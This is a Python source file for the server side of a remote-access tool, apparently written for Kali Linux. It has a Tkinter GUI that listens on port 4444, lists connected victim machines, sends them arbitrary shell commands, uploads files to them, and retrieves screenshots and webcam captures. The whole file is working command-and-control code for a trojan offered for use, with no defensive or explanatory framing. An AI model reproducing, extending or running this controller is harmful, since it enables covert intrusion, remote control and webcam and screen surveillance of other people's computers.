# === server_gui.py (Kali) ===
import socket
import threading
import tkinter as tk
from tkinter import simpledialog, messagebox, filedialog
import os
from datetime import datetime

clients = {}
addresses = {}

def handle_client(conn, addr):
    try:
        pc_name = conn.recv(1024).decode()
        clients[pc_name] = conn
        addresses[pc_name] = addr
        update_client_list()
    except Exception as e:
        print(f"[!] Erreur avec {addr}: {e}")

def update_client_list():
    client_listbox.delete(0, tk.END)
    for pc in clients:
        client_listbox.insert(tk.END, pc)

def receive_file(sock, save_path):
    with open(save_path, "wb") as f:
        while True:
            data = sock.recv(1024)
            if data.endswith(b"<END>"):
                f.write(data[:-5])
                break
            f.write(data)

def send_command():
    pc = client_listbox.get(tk.ACTIVE)
    if not pc or pc not in clients:
        messagebox.showwarning("Erreur", "Sélectionne un client")
        return
    cmd = cmd_entry.get()
    conn = clients[pc]

    try:
        if cmd.startswith("upload:"):
            filepath = cmd.split(":", 1)[1]
            if not os.path.exists(filepath):
                messagebox.showerror("Erreur", "Fichier introuvable")
                return
            conn.send(f"upload:{filepath}".encode())
            ack = conn.recv(1024)
            if ack == b"READY":
                with open(filepath, "rb") as f:
                    while True:
                        chunk = f.read(1024)
                        if not chunk:
                            break
                        conn.send(chunk)
                    conn.send(b"<END>")
                messagebox.showinfo("Succès", "Fichier envoyé")

        elif cmd in ["screenshot", "camera"]:
            conn.send(cmd.encode())
            filename = f"/root/{pc}_{cmd}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            receive_file(conn, filename)
            messagebox.showinfo("Réussi", f"{cmd} reçu et sauvegardé dans /root")

        else:
            conn.send(cmd.encode())
            output = conn.recv(4096).decode(errors='ignore')
            output_text.delete(1.0, tk.END)
            output_text.insert(tk.END, output)

    except Exception as e:
        messagebox.showerror("Erreur", f"Erreur lors de l'envoi : {e}")

def start_server():
    host = "0.0.0.0"
    port = 4444
    s = socket.socket()
    s.bind((host, port))
    s.listen(5)
    status_label.config(text=f"[+] En écoute sur {host}:{port}")

    def accept_clients():
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

    threading.Thread(target=accept_clients, daemon=True).start()

# === GUI ===
root = tk.Tk()
root.title("Remote Tool Deluxe - MAI ❤️")
root.geometry("700x500")

frame_top = tk.Frame(root)
frame_top.pack(pady=10)

client_listbox = tk.Listbox(frame_top, width=30)
client_listbox.pack(side=tk.LEFT, padx=10)

frame_cmd = tk.Frame(root)
frame_cmd.pack(pady=10)

cmd_entry = tk.Entry(frame_cmd, width=60)
cmd_entry.pack(side=tk.LEFT, padx=5)
tk.Button(frame_cmd, text="Envoyer", command=send_command).pack()

output_text = tk.Text(root, height=15)
output_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

status_label = tk.Label(root, text="[.] En attente")
status_label.pack(pady=5)

start_server()
root.mainloop()
